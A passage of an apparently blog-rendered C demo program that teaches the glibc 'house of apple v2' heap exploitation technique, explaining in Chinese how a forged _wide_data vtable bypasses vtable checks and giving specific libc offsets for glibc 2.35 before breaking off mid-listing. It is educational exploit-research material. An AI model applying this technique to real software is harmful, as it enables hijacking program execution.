class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 23-3-16.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;util.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> exploit_mode 3</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;  sh&quot;</span>;</span><br><span class="line"><span class="type">char</span>* binsh2 = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示house of apple v2利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;测试于ubuntu 22.04，glibc版本：Ubuntu GLIBC 2.35-0ubuntu3.1。\n&quot;</span>);</span><br><span class="line">    printf_color(WHITE, HIGHLIGHT, <span class="string">&quot;1. 原理介绍\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;与house of apple v1写堆地址不同，house of apple v2能够直接控制程序执行流。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;v2的函数调用链的前半部分与v1是相同的，都是使用exit函数调用到_IO_flush_all_lockp。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;再一次回顾_IO_flush_all_lockp这个函数的内容：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/genops.c， line 684)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_flush_all_lockp (int do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int result = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE *fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_start_noarg (flush_cleanup);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_lock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_flockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   || (_IO_vtable_offset (fp) == 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   )\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tresult = EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_funlockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_unlock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_end (0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return result;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意这里的_IO_OVERFLOW()，这实际上是一个宏定义，内容如下：&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其主要功能是调用_IO_FILE_plus_complete中的vtable中的OVERFLOW函数，这是一个函数指针。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以注意到最终这里会调用IO_validate_vtable函数，这个函数是用于检测vtable的合法性的。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;有这个函数做检查，我们自己伪造的vtable很难绕过，因为它会检查vtable的地址是否在libc统一保存vtable的地址块中。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;而在house of apple v2中，我们使用的不是_IO_OVERFLOW，而是_IO_Wxxx，这是两类相似的函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;以_IO_WDOALLOCATE为例：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libioP.h)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define _IO_WIDE_JUMPS(THIS) \\\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其中_IO_CAST_FIELD_ACCESS会直接取出对应的函数指针准备执行，因此可以看到这里就没有上面函数的检查。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;它会执行_IO_FILE-&gt;_wide_data-&gt;_wide_vtable中的函数。因此v2与v1同样利用了_wide_data。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此我们伪造_wide_data的_wide_vtable中的函数指针就可以达到控制函数执行流的目的。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;这也就能够解释为什么我们不能够直接伪造_IO_flush_all_lockp中处理的_IO_FILE结构体中的vtable指针。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;因为我们伪造的_IO_FILE无法通过vtable合法性检查。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;我们只能将vtable指针修改成libc中已有的其他vtable指针，这也是house of apple的关键步骤。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libio.h, line 121)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_wide_data\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_buf_end;\t\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_save_base;\t/* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_backup_base;\t/* Pointer to first valid character of\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t   backup area */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_save_end;\t/* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __mbstate_t _IO_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __mbstate_t _IO_last_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_codecvt _codecvt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t _shortbuf[1];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mconst struct _IO_jump_t *_wide_vtable;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(WHITE, HIGHLIGHT, <span class="string">&quot;2. 几种利用方式介绍\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;经过上面的介绍，我们知道了house of apple v2的主要步骤：\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, UNDEFINED, <span class="string">&quot;a. 修改_IO_flush_all_lockp中处理的_IO_FILE的vtable为已有vtable，伪造_wide_data-&gt;_wide_vtable指针。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, UNDEFINED, <span class="string">&quot;b. 调用该vtable后期望能够调用到_wide_data-&gt;_wide_vtable中的函数指针。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;具体来看，有几条执行流能够让我们控制rip，下面就来一一介绍。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;参考资料：https://bbs.kanxue.com/thread-273832.htm\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;不过无论是哪一条路线，都需要获得libc的基地址：&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> libc_base = get_libc_base();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\033[0m\n\n&quot;</span>, libc_base);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;还有两个堆地址，一个保存fake FILE，一个保存fake _wide_data vtable：&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>* <span class="title">fake_FILE</span> =</span> (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span>* <span class="title">fake_wide_data</span> =</span> (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\033[0m\n\n&quot;</span>, fake_FILE);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(WHITE, HIGHLIGHT, <span class="string">&quot;(1) _IO_wfile_overflow 路线\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这个函数指的是第a步中期待从已有vtable跳入的函数，下同。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;考虑到这个函数在不止一个vtable中都有出现，因此我们可以修改成多个vtable的值。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在/libio/wfileops.c中(line 1025, 1051, 1075)我们就能够找到3个vtable中包含该函数：\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;_IO_wfile_jumps、_IO_wfile_jumps_mmap、_IO_wfile_jumps_maybe_mmap。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们只需要随便选择1个覆盖掉_IO_list_all的vtable即可。&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在IDA中，我们只能找到_IO_wfile_jumps这个符号，地址为0x2160C0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;不过通过查看_IO_wfile_overflow函数的交叉引用，我们可以找到另外两个jumps的地址：0x215F40和0x216000。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;为了演示需要，本程序不在原有stderr的情况下修改，而是直接修改_IO_list_all指针值为自己伪造的_IO_FILE。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;首先介绍一下_IO_wfile_overflow函数的内容：\n\n&quot;</span>);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wfileops.c, line 405)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                <span class="string">&quot;wint_t\n&quot;</span></span><br><span class="line">                <span class="string">&quot;_IO_wfile_overflow (FILE *f, wint_t wch)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;f-&gt;_flags &amp; _IO_NO_WRITES) &quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot; /* SET ERROR, _IO_NO_WRITES = 8 */\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_flags |= _IO_ERR_SEEN;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      __set_errno (EBADF);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      return WEOF;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  /* If currently reading or no buffer allocated. */\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  if ( &quot;</span>HIGHLIGHT_GREEN_HEAD<span class="string">&quot; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0&quot;</span>HIGHLIGHT_PURPLE_HEAD<span class="string">&quot;) // _IO_CURRENTLY_PUTTING = 0x800\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      /* Allocate a buffer if needed. */\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      if (&quot;</span>HIGHLIGHT_GREEN_HEAD<span class="string">&quot;f-&gt;_wide_data-&gt;_IO_write_base == 0&quot;</span>HIGHLIGHT_PURPLE_HEAD<span class="string">&quot;)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t  &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;_IO_wdoallocbuf (f);\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                <span class="string">&quot;\t  _IO_free_wbackup_area (f);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t\t     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t  if (f-&gt;_IO_write_base == NULL)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t      _IO_doallocbuf (f);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t    &#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      else\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t  /* Otherwise must be currently reading.  If _IO_read_ptr\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     (and hence also _IO_read_end) is at the buffer end,\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     logically slide the buffer forwards one block (by setting\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     the read pointers to all point at the beginning of the\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     block).  This makes room for subsequent output.\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     Otherwise, set the read pointers to _IO_read_end (leaving\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     that alone, so it can continue to correspond to the\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     external position). */\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t  if (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t      f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t      f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t\tf-&gt;_wide_data-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t    &#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\tf-&gt;_wide_data-&gt;_IO_read_end;\n&quot;</span></span><br><span class="line">                <span 